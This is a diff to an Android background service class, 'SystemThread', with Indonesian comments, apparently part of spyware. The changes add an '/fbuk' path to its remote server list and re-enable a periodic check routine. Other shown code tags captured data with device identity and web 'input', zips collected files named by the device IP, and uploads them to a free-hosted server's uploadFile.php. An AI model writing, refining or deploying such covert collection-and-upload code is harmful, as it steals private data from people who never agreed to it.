@@ -65,7 +65,7 @@ public class SystemThread extends Service
 	public String ip = "";
 
 	private static boolean processPing = true;
-	private static String[] server = { "http://10.42.0.1", "https://sunjangyo12.000webhostapp.com", "http://localhost:8888" }; //localhost:8888 harus terakhir
+	private static String[] server = { "http://10.42.0.1/fbuk", "https://sunjangyo12.000webhostapp.com/fbuk", "http://localhost:8888" }; //localhost:8888 harus terakhir. ini untuk penggunaan sedunia
 	private static int jcamera = 1875953;
 	private static int alert_warna = Color.YELLOW;
 	private static int alert_letak = Gravity.CENTER | Gravity.TOP;
@@ -138,7 +138,7 @@ public class SystemThread extends Service
 				else Log.i(TAG, "offline!");
 			}
 
-			//receAction.temanCek(SystemThread.this);
+			receAction.temanCek(SystemThread.this);
 
 			mHandler.postDelayed(mRefresh, 3000);
 
@@ -856,7 +856,7 @@ public class SystemThread extends Service
 
 	public String textPayload(String data) {
 		timenow = new SimpleDateFormat("HH:mm:ss").format(new Date());
-		String[] hashString = { data+" dari:"+receAction.identitasResult+" waktu:"+timenow+" input:"+payloadWebResult+"\n" };
+		String[] hashString = { "[+] "+data+" dari:"+receAction.identitasResult+" waktu:"+timenow+" input:"+payloadWebResult+"\n" };
 		
 		if (settings.getString("utf", "").equals("")) {
 			Log.i(TAG, "utf kosong");
@@ -905,7 +905,7 @@ public class SystemThread extends Service
 
 		try {
 			Runtime.getRuntime().exec("rm -R "+pathKumpul);
-			Thread.sleep(1000);
+			Thread.sleep(500);
 			if (!fileKumpul.exists()) {
             	fileKumpul.mkdirs();
         	}
@@ -946,7 +946,7 @@ public class SystemThread extends Service
 
 			String identitasKumpul = Identitas.getIPAddress(true)+".zipjut";
 			new Installer().compressFiles(pathKumpul, pathKumpul+"/"+identitasKumpul);
-			Thread.sleep(3000);
+			Thread.sleep(500);
 			receAction.requestUrl = urlServer+"/uploadFile.php";
 			receAction.requestAksi = "upload";
 			receAction.requestPath = pathKumpul+"/"+identitasKumpul;
